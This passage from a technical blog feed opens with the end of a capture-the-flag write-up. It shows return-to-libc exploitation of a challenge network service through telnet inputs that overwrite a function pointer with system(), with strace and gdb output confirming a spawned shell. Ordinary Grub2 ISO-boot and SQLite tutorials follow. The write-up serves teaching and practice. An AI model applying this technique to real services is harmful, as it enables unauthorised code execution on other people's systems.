<p>The offset is -613104, <strong>note</strong> that it depends on the version of libc, hence the exploit isn’t too reliable. Let’s focus though on exploiting locally and postpone the computation of the remote offset. We will write at the same address as in PoC1 but we will write the value of <code>system</code> function i.e. <code>address_of_recv_function+OFFSET</code>.</p>
<pre><code>$ telnet localhost 31337
read
Input position to read from:
-32
Value at position -32: -1217696784
write
Input position to write to:
-2147483634
Input numeric value to write:
-1218309888
Value at position -2147483634: -1218309888
math
Result of math: -1</code></pre>
<p>Reading from <strong>-32</strong> it’s equivalent of reading -32*4 bytes before our buffer. 0x804c040-32*4 is 0x804bfc0, this is the <code>recv</code> GOT entry. <strong>-1218309888</strong> is -1217696784-613104.</p>
<p>Hey, it didn’t crashed, that’s a plus! Meanwhile, back at the castle.</p>
<pre><code>$ strace -f ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
[...]
[pid  4901] send(4, &quot;Value at position -2147483634: -&quot;..., 43, 0) = 43
[pid  4901] read(4, &quot;m&quot;, 1)             = 1
[pid  4901] read(4, &quot;a&quot;, 1)             = 1
[pid  4901] read(4, &quot;t&quot;, 1)             = 1
[pid  4901] read(4, &quot;h&quot;, 1)             = 1
[pid  4901] read(4, &quot;\r&quot;, 1)            = 1
[pid  4901] read(4, &quot;\n&quot;, 1)            = 1
[...]
[pid  4902] execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;&quot;], [/* 31 vars */]) = 0
[pid  4902] brk(0)                      = 0x9a04000
[...]</code></pre>
<p>We successfully <strong>called execve</strong>!</p>
</section>
<section id="parameters-to-execve" class="level2">
<h2>Parameters to execve</h2>
<p>We are able to run <code>execve</code> but we don’t control the parameters … yet. Let’s see with what parameters <code>execve</code> is called.</p>
<pre><code>$ gdb ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
[...]
Reading symbols from /root/back2skool-3fbcd46db37c50ad52675294f5667909d1f...(no debugging symbols found)...done.
(gdb) set follow-fork-mode child 
(gdb) catch syscall execve 
Catchpoint 1 (syscall &#39;execve&#39; [11])
(gdb) r
[...]
Catchpoint 1 (call to syscall &#39;execve&#39;), 0xb7fe2424 in __kernel_vsyscall ()
(gdb) info registers 
eax            0xffffffda	-38
ecx            0xbffff3b4	-1073744972
edx            0xbffff5ac	-1073744468
ebx            0xb7fa5a5a	-1208329638
[...]
(gdb) x/s $ebx
0xb7fa5a5a:	 &quot;/bin/sh&quot;
(gdb) x/5x $ecx
0xbffff3b4:	0xb7fa5a5f	0xb7fa5a57	0x0804c040	0x00000000
0xbffff3c4:	0xb7ead180
(gdb) x/s ((char **)$ecx)[0]
0xb7fa5a5f:	 &quot;sh&quot;
(gdb) x/s ((char **)$ecx)[1]
0xb7fa5a57:	 &quot;-c&quot;
(gdb) x/s ((char **)$ecx)[2]
0x804c040 &lt;values&gt;:	 &quot;&quot;
(gdb) </code></pre>
<p>Because we’re using <code>system</code> function the first parameters are set accordingly (<code>sh -c</code>) but the actual command (<code>(char **)$ecx)[2]</code>) is empty. You can have a look at <code>execve</code> syscall <a href="http://www.kernel.org/doc/man-pages/online/pages/man2/execve.2.html">parameters</a> and the <a href="http://stackoverflow.com/questions/2535989/what-are-the-calling-conventions-for-unix-linux-system-calls-on-x86-64">calling convention</a> for it. Here we’re very <strong>lucky</strong>, the command that is passed to system is our buffer with values, the initial table. Let’s recap our approach:</p>
<ul>
<li>get the address of <code>recv</code> function via GOT</li>
<li>set the pointer of <code>math</code> function to <code>system</code> by adding an offset to <code>recv</code> function address</li>
<li>set the parameters in the workspace table</li>
<li>trigger the exploit by using the <code>math</code> function</li>
<li>profit</li>
</ul>
</section>
<section id="getting-some-output" class="level2">
<h2>Getting some output</h2>
<p>The only problem was that the communication socket was number 4 and the output went to file descriptor 1, but running the command with <code>&gt;&amp;4 2&gt;&amp;4</code> appended, did the trick for us.</p>
</section>
<section id="the-offset-the-achilles-heel-of-the-exploit" class="level2">
<h2>The offset, the Achilles’ Heel of the exploit</h2>
<p>Well, the exploit worked locally, but remote it didn’t.</p>
<p>Recall that when computing the offset of <code>system</code> function in respect to <code>recv</code> function, we were able to access the libc that was used on the target <code>system</code>. A few ideas appeared:</p>
<ul>
<li>try different offsets by gathering as many libcs as possible from well known distros. After one hour of trying all the libc binaries from Ubuntu I start to wonder if I’m on the right track.</li>
<li>try random values - this didn’t work at all and it was time consuming (I was already tired and my thinking was bad)</li>
<li>get a copy of in use libc - this is a problem, because we cannot do <code>open</code>, in the best case, we might do some <code>send</code> over the socket using as buffer input the libc mapping.</li>
<li>hope for the best, and use another challenge (which we already exploited) and download that libc file and hope that this system has the same one.</li>
<li>try to do a more intelligent search by matching function entries (<code>push   %ebp</code>, <code>mov %esp, %ebp</code> etc.), this would require too much work.</li>
<li>use some magical tool/table that I’m not sure it exists.</li>
</ul>
<p>We used a <strong>previous</strong> level and was able to <strong>download</strong> the libc, this libc was identical with the one that was in use by the current challenge, so we were able to compute the offset for the remote system.</p>
<p>I don’t know of any method of doing a reliable return-to-libc attack without knowing the addresses of some functions. Maybe there’s a method of getting all the symbols after knowing the libc base, that would be neat.</p>
<p>The final exploit can be found <a href="res/pwn250.py">here</a>.</p>
</section>
</section>
<section id="conclusion" class="level1">
<h1>Conclusion</h1>
<p>We’ve presented a way of doing a return-to-libc attack, even though this is a primitive return-to-libc approach, we used a function from libc. We also had to compute the offset of that function using the address of another function - this makes the exploit unreliable.</p>
<p>In the end, it boils down to have the right skill for using the right tools, it’s nothing fancy.</p>
</section>

    </div>
  </div>
</div>
]]></description>
    <pubDate>Tue, 19 Feb 2013 00:00:00 UT</pubDate>
    <guid>http://techblog.rosedu.org/ctf-return-to-libc.html</guid>
</item>
<item>
    <title>Grub2 and ISO boot</title>
    <link>http://techblog.rosedu.org/grub2-and-iso-boot.html</link>
    <description><![CDATA[<div class="unit-inner unit-article-inner">
  <div class="content">
    <div class="bd">
      <header>
        <div class="unit-head">
          <div class="unit-inner unit-head-inner">
            <h1 class="h2 entry-title">
              <a class="post_title" href="/grub2-and-iso-boot.html" title="Grub2 and ISO boot">Grub2 and ISO boot</a>
            </h1>
          </div><!-- unit-inner -->
        </div><!-- unit-head -->
      </header>

      <span class="date">
      <span class="published">Published on October 25, 2012</span>
      by
      <span class="author">Alexandru Juncu</span>
      </span>

      <br/>
      <span class="meta">
        Tagged:
        <span class="tags"><a href="/tags/grub2.html">grub2</a>, <a href="/tags/bootloader.html">bootloader</a>, <a href="/tags/linux.html">linux</a>, <a href="/tags/kernel.html">kernel</a>, <a href="/tags/iso.html">iso</a>, <a href="/tags/image.html">image</a></span>
      </span>

      <p>Note: This article focuses on Debian based Linux distributions.</p>
<p><strong>Grub2</strong> is the next generation Linux bootloader that is trying to replace the “Legacy” Grub version. It is a complete rewrite of Grub 1 and only lately becoming fully featured compared to the old version and even comes with some new interesting features.</p>
<p>The old Grub’s configuration was rather straightforward, everything being done in a configuration file in the <code>grub</code> directory of the <code>/boot</code> partition (it’s a common practice to have <code>/boot</code> mounted on a separate filesystem). In Debian it was usually <code>/boot/grub/menu.lst</code> and in Red Hat <code>/boot/grub/grub.conf</code> (sometimes one being a symlink to the other).</p>
<p>The configuration file for Grub2 is <code>/boot/grub/grub.cfg</code>. But the file itself should never be modified (not even root has write access). Instead, this file is generated by commands like <code>update-grub2</code>. It is generated based on other configuration files like (in Debian) <code>/etc/default/grub</code>, which has things like global configurations, timers and default settings.</p>
<p>The menu entries for the operating systems themselves are generated based on files in the <code>/etc/grub.d/</code> directory (in Debian). An interesting feature of Grub2 is the fact that these files are actually Bash scripts. OS entries don’t need to be hard coded, but can be scripted. One such script is the <code>10_linux</code> file that detects any new kernel image in the <code>/boot</code> directory and writes a new entry for it without having to manually add it. Manual entries can also be written in these files (usually in the <code>40_custom</code> script file).</p>
<p>An interesting new feature in Grub2 is the possibility to boot from an ISO file. A LiveCD can be stored in an iso file on disk and loaded by grub without having to burn it onto CD or having to boot the normal system first. A menu entry for ISO booting would look like this:</p>
<pre><code>menuentry &quot;Ubuntu LiveCD&quot; {
        loopback loop (hd0,1)/boot/iso/ubuntu-12.04-desktop-i386.iso
        linux (loop)/casper/vmlinuz boot=casper :iso-scan/filename=/boot/iso/ubuntu-12.04-desktop-i386.iso noprompt noeject
        initrd (loop)/casper/initrd.lz
}</code></pre>
<p>Based on the previous ideas, here’s a way to configure grub to make an entry for every .iso file that you have in a specified directory. First, create a directory to store the .iso files (ex. <code>/boot/iso/</code>) and move your Live CDs there.</p>
<p>Next, make a script in the <code>/etc/grub.d/</code> directory. Let’s call it <code>42_iso</code> (the number in front dictates the order in which the scripts are executed).</p>
<pre><code>#!/bin/bash

ISO_DIR=&quot;/boot/iso/&quot;

for iso in $(ls $ISO_DIR*.iso); do
	echo &quot;menuentry \&quot;$iso\&quot; {&quot;
	echo &quot;set isofile=\&quot;$iso\&quot;&quot;
	echo &quot;loopback loop (hd0,1)\$isofile&quot;
	echo &quot;linux (loop)/casper/vmlinuz boot=casper iso-scan/filename=\$isofile noprompt noeject&quot;
	echo &quot;initrd (loop)/casper/initrd.lz&quot;
	echo &quot;}&quot;

done</code></pre>
<p>Don’t forget to give it executable access. Then run the <code>update-grub2</code> command to generate the Grub2 configuration file.</p>
<pre><code>chmod +x /etc/grub.d/42_iso
update-grub2</code></pre>
<p>Thanks to doraz for suggesting ISO booting with Grub.</p>

    </div>
  </div>
</div>
]]></description>
    <pubDate>Thu, 25 Oct 2012 00:00:00 UT</pubDate>
    <guid>http://techblog.rosedu.org/grub2-and-iso-boot.html</guid>
</item>
<item>
    <title>The fast-track, hands-on, no-nonsense introduction to SQL</title>
    <link>http://techblog.rosedu.org/sql.html</link>
    <description><![CDATA[<div class="unit-inner unit-article-inner">
  <div class="content">
    <div class="bd">
      <header>
        <div class="unit-head">
          <div class="unit-inner unit-head-inner">
            <h1 class="h2 entry-title">
              <a class="post_title" href="/sql.html" title="The fast-track, hands-on, no-nonsense introduction to SQL">The fast-track, hands-on, no-nonsense introduction to SQL</a>
            </h1>
          </div><!-- unit-inner -->
        </div><!-- unit-head -->
      </header>

      <span class="date">
      <span class="published">Published on October  5, 2012</span>
      by
      <span class="author">Dan Șerban</span>
      </span>

      <br/>
      <span class="meta">
        Tagged:
        <span class="tags"><a href="/tags/SQL.html">SQL</a>, <a href="/tags/RDBMS.html">RDBMS</a></span>
      </span>

      <p>Rather than relying on dry explanations of mathematical set theory, this tutorial is organized as a survey of SQL statements and techniques. It is designed to let you infer from examples what SQL is all about as well as the kinds of problems it can help you solve.</p>
<p>The promise of this tutorial is that you invest 30 minutes of your time and it will enable you to “speak” SQL right here, right now.</p>
<p>The uncompromising emphasis here is on raw speed of learning new things.</p>
<section id="introduction" class="level3">
<h3>Introduction</h3>
<p>SQL is the universal language that allows relational database management systems (RDBMS) to communicate with the outside world.</p>
<p>The easiest way for a developer to become familiar with SQL is by using SQLite, a file-based (serverless) RDBMS.</p>
</section>
<section id="lets-start-coding-already" class="level3">
<h3>Let’s start coding already!</h3>
<p>To check whether you already have SQLite on your GNU/Linux system, open up a terminal and run:</p>
<pre><code>which sqlite3 &amp;&amp; echo &quot;OK - SQLite found&quot;</code></pre>
<p>To install SQLite on Ubuntu, simply run:</p>
<pre><code>sudo apt-get install sqlite3</code></pre>
<p>The first few baby steps when learning SQL are:</p>
<ul>
<li>creating a new database;</li>
<li>creating a new table inside that database;</li>
<li>populating the table with some data.</li>
</ul>
<p>First, let’s create a new database. In a terminal, run:</p>
<pre><code>sqlite3 /tmp/dev.db</code></pre>
<p>You should see output similar to this:</p>
<pre><code>SQLite version 3.7.13 2012-06-11 02:05:22
Enter &quot;.help&quot; for instructions
Enter SQL statements terminated with a &quot;;&quot;
sqlite&gt;</code></pre>
<p>At this point, SQLite has created and appropriately formatted a new file, <code>/tmp/dev.db</code>, and is now waiting for you to tell it what to do.</p>
<p>You communicate your intent to SQLite by typing in SQL statements.</p>
<p>As we already mentioned, when we start working on a new database, the first thing we do is create a table.</p>
<p>At the <code>sqlite&gt;</code> prompt, type the following SQL statement:</p>
<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">CREATE</span> <span class="kw">TABLE</span> presidencies (
  <span class="kw">id</span> <span class="dt">INTEGER</span> <span class="kw">PRIMARY</span> <span class="kw">KEY</span> AUTOINCREMENT <span class="kw">NOT</span> <span class="kw">NULL</span>,
  first_name <span class="dt">VARCHAR</span>(<span class="dv">255</span>),
  other_names <span class="dt">VARCHAR</span>(<span class="dv">255</span>),
  year_from <span class="dt">INTEGER</span>,
  year_to <span class="dt">INTEGER</span>,
  notes TEXT
);</code></pre>
<p>SQLite does not give any output in response, and that means it has successfully executed the statement.</p>
<p>We now have an empty table called <code>presidencies</code>.</p>
<p>Having an empty table in a database is like having an empty spreadsheet in front of you.</p>
<p>The next step is therefore to populate the table with some data.</p>
<p>We do this by using the <code>INSERT</code> statement. Try this:</p>
<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (
  <span class="kw">NULL</span>,
  <span class="ot">&quot;Barack&quot;</span>,
  <span class="ot">&quot;Obama&quot;</span>,
  <span class="dv">2009</span>,
  <span class="dv">2012</span>,
  <span class="ot">&quot;Won against John McCain&quot;</span>
);</code></pre>
<p>Again, SQLite is not giving us any response, which means the <code>INSERT</code> statement was successfully executed.</p>
<p>If we now query the contents of the table, we should see the newly inserted row. Try this:</p>
<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">SELECT</span> * <span class="kw">FROM</span> presidencies;</code></pre>
<p>The output you should see is this:</p>
<pre><code>1|Barack|Obama|2009|2012|Won against John McCain</code></pre>
<p>As you can probably tell, the output is in the format:</p>
<pre><code>id|first_name|other_names|year_from|year_to|notes</code></pre>
<p>Since we set <code>id</code> to <code>NULL</code> in our <code>INSERT</code> statement and <code>id</code> has the <code>AUTOINCREMENT</code> attribute in the table definition, SQLite assigned the first available positive integer value and stored it as this record’s primary key.</p>
<p>“Primary key” simply means two things:</p>
<ul>
<li>The developer has communicated his intention to use this field to uniquely identify each row of this table;</li>
<li>The RDBMS will therefore enforce the uniqueness of this key and use this information to optimize its execution of SQL statements against this table.</li>
</ul>
<p>Let’s put this behavior to the test. Try the same <code>INSERT</code> statement as before, only replace <code>NULL</code> with <code>1</code> (an already existing <code>id</code>):</p>
<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (
  <span class="dv">1</span>,
  <span class="ot">&quot;Barack&quot;</span>,
  <span class="ot">&quot;Obama&quot;</span>,
  <span class="dv">2009</span>,
  <span class="dv">2012</span>,
  <span class="ot">&quot;Won against John McCain&quot;</span>
);</code></pre>
<p>The output you should see is:</p>
<pre><code>Error: PRIMARY KEY must be unique</code></pre>
<p>To change a record in the table, we are going to use an <code>UPDATE</code> statement with a precisely targeted <code>WHERE</code> clause:</p>
<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">UPDATE</span> presidencies <span class="kw">SET</span> notes = <span class="ot">&quot;His campaign slogan was yes-we-can&quot;</span> <span class="kw">WHERE</span> <span class="kw">id</span> = <span class="dv">1</span>;</code></pre>
<p>Query the whole table again to see the changes:</p>
<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">SELECT</span> * <span class="kw">FROM</span> presidencies;</code></pre>
<p>The output you should see is this:</p>
<pre><code>1|Barack|Obama|2009|2012|His campaign slogan was yes-we-can</code></pre>
<p>To remove a record from the table, we are going to use a precisely targeted <code>DELETE</code> statement:</p>
<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">DELETE</span> <span class="kw">FROM</span> presidencies <span class="kw">WHERE</span> <span class="kw">id</span> = <span class="dv">1</span>;</code></pre>
<p>Query the whole table again to verify that it’s empty.</p>
<p>To continue exploring the features of SQL we are going to need a lot more data.</p>
<p>Paste the statements below at the <code>sqlite&gt;</code> prompt:</p>
<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Theodore&quot;</span>, <span class="ot">&quot;Roosevelt&quot;</span>, <span class="dv">1905</span>, <span class="dv">1908</span>, <span class="ot">&quot;&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;William&quot;</span>, <span class="ot">&quot;Taft&quot;</span>, <span class="dv">1909</span>, <span class="dv">1912</span>, <span class="ot">&quot;&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Woodrow&quot;</span>, <span class="ot">&quot;Wilson&quot;</span>, <span class="dv">1913</span>, <span class="dv">1916</span>, <span class="ot">&quot;1st term; WW 1 begins&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Woodrow&quot;</span>, <span class="ot">&quot;Wilson&quot;</span>, <span class="dv">1917</span>, <span class="dv">1920</span>, <span class="ot">&quot;2nd term; WW 1 ends&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Warren&quot;</span>, <span class="ot">&quot;Harding&quot;</span>, <span class="dv">1921</span>, <span class="dv">1922</span>, <span class="ot">&quot;&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Calvin&quot;</span>, <span class="ot">&quot;Coolidge&quot;</span>, <span class="dv">1923</span>, <span class="dv">1924</span>, <span class="ot">&quot;1st term&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Calvin&quot;</span>, <span class="ot">&quot;Coolidge&quot;</span>, <span class="dv">1925</span>, <span class="dv">1928</span>, <span class="ot">&quot;2nd term&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Herbert&quot;</span>, <span class="ot">&quot;Hoover&quot;</span>, <span class="dv">1929</span>, <span class="dv">1932</span>, <span class="ot">&quot;&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Franklin&quot;</span>, <span class="ot">&quot;D. Roosevelt&quot;</span>, <span class="dv">1933</span>, <span class="dv">1936</span>, <span class="ot">&quot;1st term&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Franklin&quot;</span>, <span class="ot">&quot;D. Roosevelt&quot;</span>, <span class="dv">1937</span>, <span class="dv">1940</span>, <span class="ot">&quot;2nd term; WW 2 begins&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Franklin&quot;</span>, <span class="ot">&quot;D. Roosevelt&quot;</span>, <span class="dv">1941</span>, <span class="dv">1944</span>, <span class="ot">&quot;3rd term&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Harry&quot;</span>, <span class="ot">&quot;Truman&quot;</span>, <span class="dv">1945</span>, <span class="dv">1948</span>, <span class="ot">&quot;1st term; WW 2 ends&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Harry&quot;</span>, <span class="ot">&quot;Truman&quot;</span>, <span class="dv">1949</span>, <span class="dv">1952</span>, <span class="ot">&quot;2nd term&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Dwight&quot;</span>, <span class="ot">&quot;Eisenhower&quot;</span>, <span class="dv">1953</span>, <span class="dv">1956</span>, <span class="ot">&quot;1st term&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Dwight&quot;</span>, <span class="ot">&quot;Eisenhower&quot;</span>, <span class="dv">1957</span>, <span class="dv">1960</span>, <span class="ot">&quot;2nd term&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;John&quot;</span>, <span class="ot">&quot;F. Kennedy&quot;</span>, <span class="dv">1961</span>, <span class="dv">1963</span>, <span class="ot">&quot;&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Lyndon&quot;</span>, <span class="ot">&quot;Johnson&quot;</span>, <span class="dv">1964</span>, <span class="dv">1964</span>, <span class="ot">&quot;Took over when JFK was assassinated&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Lyndon&quot;</span>, <span class="ot">&quot;Johnson&quot;</span>, <span class="dv">1965</span>, <span class="dv">1968</span>, <span class="ot">&quot;2nd term&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Richard&quot;</span>, <span class="ot">&quot;Nixon&quot;</span>, <span class="dv">1969</span>, <span class="dv">1972</span>, <span class="ot">&quot;1st term&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Richard&quot;</span>, <span class="ot">&quot;Nixon&quot;</span>, <span class="dv">1973</span>, <span class="dv">1974</span>, <span class="ot">&quot;2nd term&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Gerald&quot;</span>, <span class="ot">&quot;Ford&quot;</span>, <span class="dv">1975</span>, <span class="dv">1976</span>, <span class="ot">&quot;&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Jimmy&quot;</span>, <span class="ot">&quot;Carter&quot;</span>, <span class="dv">1977</span>, <span class="dv">1980</span>, <span class="ot">&quot;&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Ronald&quot;</span>, <span class="ot">&quot;Reagan&quot;</span>, <span class="dv">1981</span>, <span class="dv">1984</span>, <span class="ot">&quot;1st term&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Ronald&quot;</span>, <span class="ot">&quot;Reagan&quot;</span>, <span class="dv">1985</span>, <span class="dv">1988</span>, <span class="ot">&quot;2nd term&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;George&quot;</span>, <span class="ot">&quot;H. W. Bush&quot;</span>, <span class="dv">1989</span>, <span class="dv">1992</span>, <span class="ot">&quot;&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Bill&quot;</span>, <span class="ot">&quot;Clinton&quot;</span>, <span class="dv">1993</span>, <span class="dv">1996</span>, <span class="ot">&quot;1st term&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Bill&quot;</span>, <span class="ot">&quot;Clinton&quot;</span>, <span class="dv">1997</span>, <span class="dv">2000</span>, <span class="ot">&quot;2nd term&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;George&quot;</span>, <span class="ot">&quot;W. Bush&quot;</span>, <span class="dv">2001</span>, <span class="dv">2004</span>, <span class="ot">&quot;1st term&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;George&quot;</span>, <span class="ot">&quot;W. Bush&quot;</span>, <span class="dv">2005</span>, <span class="dv">2008</span>, <span class="ot">&quot;2nd term&quot;</span>);
<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Barack&quot;</span>, <span class="ot">&quot;Obama&quot;</span>, <span class="dv">2009</span>, <span class="dv">2012</span>, <span class="ot">&quot;&quot;</span>);</code></pre>
<p>Let’s see how many records our table contains now:</p>
<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">SELECT</span> <span class="fu">COUNT</span>(*) <span class="kw">FROM</span> presidencies;</code></pre>
<p>The table has 30 rows.</p>
<p>We want to generate a deduplicated list of all persons who held office.</p>
<p>The SQL keyword <code>DISTINCT</code> performs the deduplication magic, and we are going to make use of the SQL text concatenation operator <code>||</code>:</p>
<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">SELECT</span> <span class="kw">DISTINCT</span> first_name || <span class="st">&#39; &#39;</span> || other_names <span class="kw">AS</span> full_name <span class="kw">FROM</span> presidencies;</code></pre>
<p>We want to find out how many presidencies began in the second half of the 20th century.</p>
<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">SELECT</span> <span class="fu">COUNT</span>(*) <span class="kw">FROM</span> presidencies <span class="kw">WHERE</span> year_from <span class="kw">BETWEEN</span> <span class="dv">1950</span> <span class="kw">AND</span> <span class="dv">1999</span>;</code></pre>
<p>The answer to that question is 14 records.</p>
<p>In 1941, the surprise attack at Pearl Harbor happened.</p>
<p>We would like to know who was president of the United States at that time.</p>
<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">SELECT</span> * <span class="kw">FROM</span> presidencies <span class="kw">WHERE</span> <span class="dv">1941</span> <span class="kw">BETWEEN</span> year_from <span class="kw">AND</span> year_to;</code></pre>
<p>The expected output:</p>
<pre><code>12|Franklin|D. Roosevelt|1941|1944|3rd term</code></pre>
<p>We stored some notes on when both world wars began and ended. Let’s query that information by asking for all records that contain the string &quot; WW &quot; inside the <code>notes</code> column.</p>
<p>To perform text matching we need to use the <code>LIKE</code> predicate.</p>
<p>Note: The percent sign has wildcard semantics in SQL.</p>
<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">SELECT</span> * <span class="kw">FROM</span> presidencies <span class="kw">WHERE</span> notes <span class="kw">LIKE</span> <span class="st">&#39;% WW %&#39;</span> <span class="kw">ORDER</span> <span class="kw">BY</span> year_from;</code></pre>
<p>The expected output:</p>
<pre><code>4|Woodrow|Wilson|1913|1916|1st term; WW 1 begins
5|Woodrow|Wilson|1917|1920|2nd term; WW 1 ends
11|Franklin|D. Roosevelt|1937|1940|2nd term; WW 2 begins
13|Harry|Truman|1945|1948|1st term; WW 2 ends</code></pre>
<p>We want a breakdown of how many presidencies were full-term (lasted the full 4 years) versus how many lasted 1 or 2 or 3 years.</p>
<p>That can also be done in SQL, however the syntax is slightly more convoluted.</p>
<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">SELECT</span>
  <span class="dv">1</span> + year_to - year_from <span class="kw">AS</span> duration, <span class="fu">COUNT</span>(*) <span class="kw">AS</span> cnt
<span class="kw">FROM</span>
  presidencies
<span class="kw">GROUP</span> <span class="kw">BY</span>
  duration
<span class="kw">ORDER</span> <span class="kw">BY</span> cnt <span class="kw">DESC</span>;</code></pre>
<p>The expected output:</p>
<pre><code>4|24
2|4
1|1
3|1</code></pre>
<p>That means there were 24 presidencies which lasted the full 4 years, 4 which lasted 2 years etc.</p>
<p><strong>Important side note</strong></p>
<p>Being able to get predictable, consistent performance is an important part of software development, and there are some performance considerations to take into account when using <code>WHERE</code> clauses.</p>
<p>The database engine performs these <code>WHERE</code> lookups significantly faster when it can rely on indexes.</p>
<p>Let’s say we know ahead of time that the most frequent queries are going to filter by <code>year_from</code> and <code>year_to</code>.</p>
<p>In that case we need to create indexes on both fields:</p>
<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">CREATE</span> <span class="kw">INDEX</span> index_on_year_from <span class="kw">ON</span> presidencies (year_from);
<span class="kw">CREATE</span> <span class="kw">INDEX</span> index_on_year_to   <span class="kw">ON</span> presidencies (year_to);</code></pre>
<p>Indexes do not make a big difference on a table with 30 records, but it is recommended to get into the habit of thinking about indexes before SQL execution times start to grow out of control.</p>
</section>
<section id="foreign-key-relationships-the-one-to-many-case" class="level3">
<h3>Foreign key relationships: the ONE-TO-MANY case</h3>
<p>Let us now explore how we can build database models for information entities which are related to one another.</p>
<p>We are going to use the geographical hierarchy of continents <code>-&gt;</code> countries <code>-&gt;</code> cities to illustrate this.</p>
<ul>
<li>A continent has many countries</li>
<li>A country has many cities</li>
</ul>
<p>Conversely:</p>
<ul>
<li>A city belongs to only one country</li>
<li>A country belongs to only one continent</li>
</ul>
<p>To create tables for each of the three information entities, run the following commands:</p>
